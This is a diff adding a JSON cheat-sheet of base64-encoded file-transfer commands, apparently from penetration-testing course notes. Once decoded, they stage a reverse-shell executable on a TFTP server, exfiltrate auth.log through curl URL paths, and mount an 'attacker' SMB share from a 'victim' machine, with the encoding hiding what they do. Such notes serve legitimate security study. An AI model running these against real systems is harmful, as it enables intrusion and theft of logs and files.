@@ -1,0 +1,36 @@
+{
+    "command": {
+        "tftp_server_linux": {
+            "description": "Setting up a TFTP server from Linux",
+            "commands": [
+                "cm9vdEBQV0stS0FMSTp+LyMgbWtkaXIgL3RmdHAKcm9vdEBQV0stS0FMSTp+LyMgYXRmdHBkIC0tZGFlbW9uIC0tcG9ydCA2OSAvdGZ0cApyb290QFBXSy1LQUxJOn4vIyBjcCByZXZlcnNlXzEzMzcuZXhlIC90ZnRwLwpyb290QFBXSy1LQUxJOn4vIyAK"
+            ]
+        },
+        "netcat_file_transfer": {
+            "description": "Transferring a file with netcat",
+            "commands": [
+                "I1JlY2VpdmVyOgpuYyAtbmx2cCAxMzM3ID4gc29tZWZpbGUuZXhlCiNTZW5kZXI6Cm5jIC1udiAxMC4wLjAuMjIgMTMzNyA8IC9zb21lIGZpbGU="
+            ]
+        },
+        "http_file_transfer": {
+            "description": "Transfer a file over HTTP/Python server",
+            "commands": [
+                "cHl0aG9uIC1tICJTaW1wbGVIVFRQU2VydmVyIiA4MDgwIDI+dGVzdC5sb2cKI1NlbmRlcjoKZm9yIGkgaW4gJChjYXQgL2xhYnMvMS4zL2F1dGgubG9nIHxiYXNlNjQpOyBkbyBjdXJsIGh0dHA6Ly8xMjcuMC4wLjE6ODA4MC8kaTsgZG9uZQojUmVjZWl2ZXI6CmNhdCB0ZXN0LmxvZyB8Z3JlcCAtRW8gJ1tBLVphLXowLTlcK1wvXD1dezQwLDEwMH0nIHxzZWQgJ3MvXC8vL2cnID5maWxlLnR4dAojUmVjZWl2ZXI6CmNhdCBmaWxlLnR4dCB8YmFzZTY0IC1kID5maWxlLnR4dC5kZWNvZGVkCg=="
+            ]
+        },
+        "smb_powershell_file_transfer": {
+            "description": "Transferring from windows to linux with smb and PowerShell",
+            "commands": [
+                "I0F0dGFja2VyOgppbXBhY2tldC1zbWJzZXJ2ZXIgU29tZVNoYXJlIGBwd2RgCiN2aWN0aW06Ck5ldy1QU0RyaXZlIC1OYW1lICJMb2NhbE5hbWVPZlNvbWVTb3J0IiAtUFNQcm92aWRlciAiRmlsZXN5c3RlbSIgLVJvb3QgIlxcUkVNLk9URS5JUC5BRERSXFxTb21lU2hhcmUiCiN2aWN0aW06CmNkIExvY2FsTmFtZU9mU29tZVNvcnQ6Cg=="
+            ]
+        },
+        "macos_sleep_prevent_file_transfer": {
+            "description": "Prevent a Mac from sleeping during a file transfer",
+            "commands": [
+                "Y2FmZmVpbmF0ZSAtcyBzY3AgYmlnZmlsZSBtZTpteXNlcnZlci9iaWdmaWxl"
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
